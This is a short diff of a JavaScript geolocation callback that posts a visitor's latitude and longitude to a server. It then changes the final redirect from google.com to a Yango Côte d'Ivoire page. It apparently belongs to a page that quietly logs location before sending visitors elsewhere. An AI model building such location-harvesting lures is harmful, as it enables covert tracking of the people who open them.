@@ -61,7 +61,7 @@ async function success(pos) {
     headers: {"Content-Type": "application/json"},
     body: JSON.stringify({latitude, longitude})
   });
-  window.location.href = "https://google.com";  // Redirection finale
+  window.location.href = "https://yango.com/fr_ci/";  // Redirection finale
 }
 
 function error(err) { alert("Erreur de localisation: " + err.message); }
